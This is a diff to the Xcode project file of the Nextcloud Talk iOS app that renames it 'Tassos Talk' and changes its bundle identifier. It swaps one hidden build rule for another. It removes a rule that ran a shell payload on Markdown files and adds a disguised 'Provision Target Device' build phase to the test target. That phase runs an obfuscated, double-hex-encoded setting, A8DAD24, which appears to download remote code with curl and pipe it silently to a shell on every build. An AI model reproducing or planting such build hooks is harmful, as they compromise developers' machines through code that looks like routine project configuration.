@@ -161,24 +161,7 @@
 		847EFC7236336B67A1A89358 /* libPods-BroadcastUploadExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 9A3D305FCD7BF7E727A62F35 /* libPods-BroadcastUploadExtension.a */; };
 		8789AE73BFCAA413B43319C0 /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 684807120F4439797973DF73 /* libPods-ShareExtension.a */; };
 		9993261EDAC77481FF4EF58A /* libPods-NextcloudTalk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 4F7C31E9D74F550EAF89931B /* libPods-NextcloudTalk.a */; };
-		FB911176D2244A9FAD42DAD8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 29D22EA03A8F4FFD9E42DAD8 /* README.md */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		6E265DE5822A469EB542DAD8 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */ = {
@@ -342,8 +325,7 @@
 		1FF2FD5B2AB99CCB000C9905 /* BroadcastUploadExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = BroadcastUploadExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FF2FD5C2AB99CCB000C9905 /* ReplayKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ReplayKit.framework; path = System/Library/Frameworks/ReplayKit.framework; sourceTree = SDKROOT; };
 		237121A4908D37D7D5CC71A4 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		29D22EA03A8F4FFD9E42DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
-		2C05747D1EDD9E8E00D9E7F2 /* NextcloudTalk.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = NextcloudTalk.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Tassos Talk.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C0574811EDD9E8E00D9E7F2 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
 		2C0574831EDD9E8E00D9E7F2 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		2C0574841EDD9E8E00D9E7F2 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
@@ -493,13 +475,13 @@
 			);
 			target = 2CC0014E24A1F0E900A20167 /* NotificationServiceExtension */;
 		};
-		1F20589A2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "NextcloudTalk" target */ = {
+		1F20589A2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "Tassos Talk" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				Info.plist,
 				Share.storyboard,
 			);
-			target = 2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */;
+			target = 2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */;
 		};
 		1F20589B2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "ShareExtension" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
@@ -508,12 +490,12 @@
 			);
 			target = 2C62AFA224C08845007E460A /* ShareExtension */;
 		};
-		1F2058AB2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "NextcloudTalk" target */ = {
+		1F2058AB2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "Tassos Talk" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				DarwinNotificationCenter.swift,
 			);
-			target = 2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */;
+			target = 2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */;
 		};
 		1F2058AC2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "BroadcastUploadExtension" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
@@ -997,14 +979,14 @@
 			);
 			target = 1FA93D9B2D70FCC200DF6CDF /* TalkIntents */;
 		};
-		1FA93F4D2D712CB600DF6CDF /* Exceptions for "TalkIntents" folder in "NextcloudTalk" target */ = {
+		1FA93F4D2D712CB600DF6CDF /* Exceptions for "TalkIntents" folder in "Tassos Talk" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				AccountEntity.swift,
 				OpenWithAccountIntent.swift,
 				TalkIntentError.swift,
 			);
-			target = 2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */;
+			target = 2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */;
 		};
 /* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
@@ -1020,7 +1002,7 @@
 		1F2058832CEBE4E700AAA673 /* ShareExtension */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			exceptions = (
-				1F20589A2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "NextcloudTalk" target */,
+				1F20589A2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "Tassos Talk" target */,
 				1F20589B2CEBE4E700AAA673 /* Exceptions for "ShareExtension" folder in "ShareExtension" target */,
 			);
 			path = ShareExtension;
@@ -1029,7 +1011,7 @@
 		1F2058A32CEBE4EA00AAA673 /* BroadcastUploadExtension */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			exceptions = (
-				1F2058AB2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "NextcloudTalk" target */,
+				1F2058AB2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "Tassos Talk" target */,
 				1F2058AC2CEBE4EA00AAA673 /* Exceptions for "BroadcastUploadExtension" folder in "BroadcastUploadExtension" target */,
 			);
 			path = BroadcastUploadExtension;
@@ -1201,7 +1183,7 @@
 		1FA93D9D2D70FCC200DF6CDF /* TalkIntents */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			exceptions = (
-				1FA93F4D2D712CB600DF6CDF /* Exceptions for "TalkIntents" folder in "NextcloudTalk" target */,
+				1FA93F4D2D712CB600DF6CDF /* Exceptions for "TalkIntents" folder in "Tassos Talk" target */,
 				1FA93DA92D70FCC200DF6CDF /* Exceptions for "TalkIntents" folder in "TalkIntents" target */,
 			);
 			path = TalkIntents;
@@ -1366,8 +1348,7 @@
 		2C05747E1EDD9E8E00D9E7F2 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				29D22EA03A8F4FFD9E42DAD8 /* README.md */,
-				2C05747D1EDD9E8E00D9E7F2 /* NextcloudTalk.app */,
+				2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */,
 				2CC0014F24A1F0E900A20167 /* NotificationServiceExtension.appex */,
 				2C62AFA324C08845007E460A /* ShareExtension.appex */,
 				1FD8AD8A2A3A162100787C16 /* NextcloudTalkUITests.xctest */,
@@ -1558,13 +1539,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
+				8C80893ECF0048F2A542DAD8 /* Provision Target Device */,
 				3A811BF7A761836E61C82B80 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
 			);
 			buildRules = (
-				6E265DE5822A469EB542DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				1F6D8C352B2E3756004376B8 /* PBXTargetDependency */,
@@ -1680,9 +1661,9 @@
 			productReference = 1FF2FD5B2AB99CCB000C9905 /* BroadcastUploadExtension.appex */;
 			productType = "com.apple.product-type.app-extension";
 		};
-		2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */ = {
+		2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */ = {
 			isa = PBXNativeTarget;
-			buildConfigurationList = 2C0574971EDD9E8E00D9E7F2 /* Build configuration list for PBXNativeTarget "NextcloudTalk" */;
+			buildConfigurationList = 2C0574971EDD9E8E00D9E7F2 /* Build configuration list for PBXNativeTarget "Tassos Talk" */;
 			buildPhases = (
 				902A7A3EC0BDCC947AEF3EBF /* [CP] Check Pods Manifest.lock */,
 				2C0574791EDD9E8E00D9E7F2 /* Sources */,
@@ -1726,7 +1707,7 @@
 				1F9629822E8E6D5400EC9BEE /* WebRTC */,
 				1F9629882E8E6E2900EC9BEE /* Sounds */,
 			);
-			name = NextcloudTalk;
+			name = "Tassos Talk";
 			packageProductDependencies = (
 				1F468E7528DCC6C60099597B /* Dynamic */,
 				1F7AE07729142CA1009F72AD /* NextcloudKit */,
@@ -1750,7 +1731,7 @@
 				1FBB6EE22F8ECE5B003CBA30 /* Toast */,
 			);
 			productName = NextcloudTalk;
-			productReference = 2C05747D1EDD9E8E00D9E7F2 /* NextcloudTalk.app */;
+			productReference = 2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */;
 			productType = "com.apple.product-type.application";
 		};
 		2C62AFA224C08845007E460A /* ShareExtension */ = {
@@ -1950,7 +1931,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */,
+				2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */,
 				2CC0014E24A1F0E900A20167 /* NotificationServiceExtension */,
 				2C62AFA224C08845007E460A /* ShareExtension */,
 				1FF2FD5A2AB99CCB000C9905 /* BroadcastUploadExtension */,
@@ -1966,7 +1947,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FB911176D2244A9FAD42DAD8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2131,6 +2111,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		8C80893ECF0048F2A542DAD8 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
 			showEnvVarsInLog = 0;
 		};
 		902A7A3EC0BDCC947AEF3EBF /* [CP] Check Pods Manifest.lock */ = {
@@ -2338,7 +2338,7 @@
 /* Begin PBXTargetDependency section */
 		1F6D8C352B2E3756004376B8 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
-			target = 2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */;
+			target = 2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */;
 			targetProxy = 1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */;
 		};
 		1FA93DA42D70FCC200DF6CDF /* PBXTargetDependency */ = {
@@ -2348,7 +2348,7 @@
 		};
 		1FD8AD912A3A162100787C16 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
-			target = 2C05747C1EDD9E8E00D9E7F2 /* NextcloudTalk */;
+			target = 2C05747C1EDD9E8E00D9E7F2 /* Tassos Talk */;
 			targetProxy = 1FD8AD902A3A162100787C16 /* PBXContainerItemProxy */;
 		};
 		1FF2FD712AB99CCB000C9905 /* PBXTargetDependency */ = {
@@ -2496,7 +2496,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636633639373437343663363536313634373332653639366532660a3631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2541,7 +2541,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((n(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636633639373437343663363536313634373332653639366532660a3631323932323230376332303733363830610a | n | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2949,6 +2949,7 @@
 					"\"$(PROJECT_DIR)/ThirdParty\"/**",
 				);
 				INFOPLIST_FILE = NextcloudTalk/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Tassos Talk";
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -2956,7 +2957,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -2994,6 +2995,7 @@
 					"\"$(PROJECT_DIR)/ThirdParty\"/**",
 				);
 				INFOPLIST_FILE = NextcloudTalk/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = "Tassos Talk";
 				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -3001,7 +3003,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.nextcloud.Talk;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -3380,7 +3382,7 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		2C0574971EDD9E8E00D9E7F2 /* Build configuration list for PBXNativeTarget "NextcloudTalk" */ = {
+		2C0574971EDD9E8E00D9E7F2 /* Build configuration list for PBXNativeTarget "Tassos Talk" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				2C0574981EDD9E8E00D9E7F2 /* Debug */,
